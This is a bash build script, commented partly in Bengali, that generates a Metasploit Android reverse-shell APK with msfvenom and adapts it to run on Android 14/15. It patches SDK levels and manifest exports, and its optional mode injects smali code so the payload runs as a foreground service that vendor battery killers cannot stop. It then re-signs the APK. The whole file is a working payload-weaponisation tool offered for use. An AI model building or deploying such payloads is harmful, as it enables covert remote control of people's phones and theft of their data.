#!/usr/bin/env bash
# build_payload.sh — Android meterpreter payload builder for MODERN Android (14/15+)
#
# msfvenom-এর পুরনো payload (targetSdk 17) Android 11+ এ install হয় না। এই script
# automaticভাবে: payload বানায় → targetSdk 34/minSdk 21 প্যাচ করে → android:exported
# fix করে → resources.arsc uncompressed রাখে → zipalign + apksigner দিয়ে sign করে।
#
# Usage:
#   ./build_payload.sh [--fgs] <LHOST> <LPORT> [out.apk]
#   --fgs  : payload-কে FOREGROUND SERVICE বানায় (XOS/aggressive battery kill
#            এড়াতে) — notification সহ চলে, KillZone বাইপাস। Aggressive
#            vendors (Infinix/Transsion, Xiaomi, Oppo...) — এর জন্য recommended।
#   LHOST=127.0.0.1 হলে "adb reverse tcp:<LPORT> tcp:<LPORT>" USB-র ভেতর দিয়ে session।

set -euo pipefail

FGS=0
if [ "${1:-}" = "--fgs" ]; then FGS=1; shift; fi

LHOST="${1:?usage: build_payload.sh [--fgs] LHOST LPORT [out.apk]}"
LPORT="${2:?usage: build_payload.sh [--fgs] LHOST LPORT [out.apk]}"
OUT="${3:-payload.apk}"
ROOT="$(cd "$(dirname "$0")" && pwd)"
# apktool: repo-local copy preferred, else APKTOOL_JAR override, else /tmp
if [ -f "$ROOT/apktool.jar" ]; then
    APT="${APKTOOL_JAR:-$ROOT/apktool.jar}"
else
    APT="${APKTOOL_JAR:-/tmp/apktool.jar}"
fi
BT="${BUILD_TOOLS:-/home/div-admin/Android/Sdk/build-tools/35.0.0}"
WORK="$ROOT/.payload-build"
RAW="$WORK/raw.apk"
SRC="$WORK/src"

[ -f "$APT" ] || { echo "apktool.jar missing at $APT"; exit 1; }
[ -x "$BT/apksigner" ] || { echo "build-tools missing at $BT"; exit 1; }

echo "[1/7] msfvenom (LHOST=$LHOST LPORT=$LPORT${FGS:+ , FGS=on}) ..."
mkdir -p "$WORK"
rm -f "$RAW"
if [ -n "${PAYLOAD_SRC:-}" ] && [ -f "$PAYLOAD_SRC" ]; then
    echo "  using existing payload: $PAYLOAD_SRC"
    cp "$PAYLOAD_SRC" "$RAW"
else
    msfvenom -p android/shell/reverse_tcp LHOST="$LHOST" LPORT="$LPORT" -o "$RAW" >/dev/null 2>&1
fi

echo "[2/7] apktool decode ..."
rm -rf "$SRC"
if [ "$FGS" = "1" ]; then
    java -jar "$APT" d "$RAW" -f -o "$SRC" >/dev/null 2>&1   # full (smali needed for FGS patch)
else
    java -jar "$APT" d "$RAW" -s -f -o "$SRC" >/dev/null 2>&1
fi

echo "[3/7] patch SDK 21/34 + android:exported ..."
sed -i 's|minSdkVersion: 10|minSdkVersion: 21|; s|targetSdkVersion: 17|targetSdkVersion: 34|' "$SRC/apktool.yml"
sed -i 's|<activity android:label="@string/app_name" android:name=".MainActivity"|<activity android:exported="true" android:label="@string/app_name" android:name=".MainActivity"|' "$SRC/AndroidManifest.xml"
sed -i 's|<receiver android:label="MainBroadcastReceiver" android:name=".MainBroadcastReceiver"|<receiver android:exported="true" android:label="MainBroadcastReceiver" android:name=".MainBroadcastReceiver"|' "$SRC/AndroidManifest.xml"
sed -i 's|<service android:exported="true" android:name=".MainService"/>|<service android:exported="true" android:foregroundServiceType="dataSync" android:name=".MainService"/>|' "$SRC/AndroidManifest.xml"

if [ "$FGS" = "1" ]; then
    # NoDisplay activity = instant "background" -> vendor freezers (XOS Hiber etc.)
    # freeze the uid ~3s later. A transparent window keeps the activity TOP.
    sed -i 's|@android:style/Theme.NoDisplay|@android:style/Theme.Translucent.NoTitleBar|' "$SRC/AndroidManifest.xml"
fi

if [ "$FGS" = "1" ]; then
    echo "[3b/7] foreground-service smali patches ..."
    python3 - "$SRC" <<'PY'
import sys
from pathlib import Path
root = Path(sys.argv[1])

# 1) FOREGROUND_SERVICE permissions in manifest
mani = root / "AndroidManifest.xml"
text = mani.read_text(encoding="utf-8")
if 'android.permission.FOREGROUND_SERVICE"' not in text:
    text = text.replace(
        '<uses-permission android:name="android.permission.INTERNET"/>',
        '<uses-permission android:name="android.permission.INTERNET"/>\n'
        '    <uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>\n'
        '    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC"/>',
    )
mani.write_text(text, encoding="utf-8")

# 2) MainService.onStartCommand -> startForeground() before Payload.start()
svc = root / "smali/com/metasploit/stage/MainService.smali"
s = svc.read_text(encoding="utf-8")
old = """.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 1

    invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V

    const/4 v0, 0x1

    return v0
.end method"""
new = """.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 4

    const-string v0, "msf"

    const/4 v1, 0x1

    new-instance v2, Landroid/app/NotificationChannel;

    invoke-direct {v2, v0, v0, v1}, Landroid/app/NotificationChannel;-><init>(Ljava/lang/String;Ljava/lang/CharSequence;I)V

    const-string v0, "notification"

    invoke-virtual {p0, v0}, Landroid/app/Service;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/NotificationManager;

    invoke-virtual {v0, v2}, Landroid/app/NotificationManager;->createNotificationChannel(Landroid/app/NotificationChannel;)V

    new-instance v1, Landroid/app/Notification$Builder;

    const-string v2, "msf"

    invoke-direct {v1, p0, v2}, Landroid/app/Notification$Builder;-><init>(Landroid/content/Context;Ljava/lang/String;)V

    const v2, 0x1080093

    invoke-virtual {v1, v2}, Landroid/app/Notification$Builder;->setSmallIcon(I)Landroid/app/Notification$Builder;

    const-string v2, "PhoneSploit"

    invoke-virtual {v1, v2}, Landroid/app/Notification$Builder;->setContentTitle(Ljava/lang/CharSequence;)Landroid/app/Notification$Builder;

    const-string v2, "Meterpreter active"

    invoke-virtual {v1, v2}, Landroid/app/Notification$Builder;->setContentText(Ljava/lang/CharSequence;)Landroid/app/Notification$Builder;

    invoke-virtual {v1}, Landroid/app/Notification$Builder;->build()Landroid/app/Notification;

    move-result-object v1

    const/4 v0, 0x1

    const/4 v2, 0x1

    invoke-virtual {p0, v0, v1, v2}, Landroid/app/Service;->startForeground(ILandroid/app/Notification;I)V

    invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V

    const/4 v0, 0x1

    return v0
.end method"""
if old not in s:
    raise SystemExit("ERROR: onStartCommand pattern not found — aborting FGS patch")
s = s.replace(old, new)

# 3) startService -> startForegroundService (caller may be backgrounded)
s = s.replace(
    "Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;",
    "Landroid/content/Context;->startForegroundService(Landroid/content/Intent;)Landroid/content/ComponentName;",
)
svc.write_text(s, encoding="utf-8")

# 4) keep the app in TOP/foreground state: remove MainActivity.finish() so the
#    NoDisplay activity never closes -> XOS/aggressive vendors cannot freeze the uid
act = root / "smali/com/metasploit/stage/MainActivity.smali"
a = act.read_text(encoding="utf-8")
finish_line = "    invoke-virtual {p0}, Lcom/metasploit/stage/MainActivity;->finish()V"
if finish_line not in a:
    raise SystemExit("ERROR: MainActivity.finish() pattern not found — aborting")
a = a.replace(finish_line + "\n\n", "")
act.write_text(a, encoding="utf-8")
print("  FGS smali + manifest patches applied")
PY
fi

echo "[4/7] apktool rebuild ..."
java -jar "$APT" b "$SRC" -o "$WORK/rebuilt.apk" >/dev/null 2>&1

echo "[5/7] repack (resources.arsc + manifest STORED — Android 11+ rule) ..."
python3 - "$WORK/rebuilt.apk" "$WORK/stored.apk" <<'PY'
import sys, zipfile
zin = zipfile.ZipFile(sys.argv[1])
with zipfile.ZipFile(sys.argv[2], "w") as zout:
    for it in zin.infolist():
        d = zin.read(it.filename)
        if it.filename in ("resources.arsc", "AndroidManifest.xml"):
            it.compress_type = zipfile.ZIP_STORED
        zout.writestr(it, d)
zin.close()
PY

echo "[6/7] zipalign + apksigner sign ..."
"$BT/zipalign" -f 4 "$WORK/stored.apk" "$WORK/aligned.apk"
if [ ! -f "$ROOT/debug.keystore" ]; then
    keytool -genkeypair -keystore "$ROOT/debug.keystore" -alias androiddebugkey \
        -keyalg RSA -keysize 2048 -validity 10950 \
        -dname "CN=Android Debug,O=Android,C=US" \
        -storepass android -keypass android >/dev/null 2>&1
fi
"$BT/apksigner" sign --ks "$ROOT/debug.keystore" --ks-pass pass:android \
    --key-pass pass:android --out "$OUT" "$WORK/aligned.apk"

echo "[7/7] verify ..."
"$BT/apksigner" verify "$OUT"
echo "DONE: $OUT (LHOST=$LHOST LPORT=$LPORT${FGS:+ , FGS=on})"

if [ "$LHOST" = "127.0.0.1" ]; then
    echo ""
    echo "TIP: LHOST 127.0.0.1 হলে phone-এ চালান:"
    echo "  adb reverse tcp:$LPORT tcp:$LPORT"
fi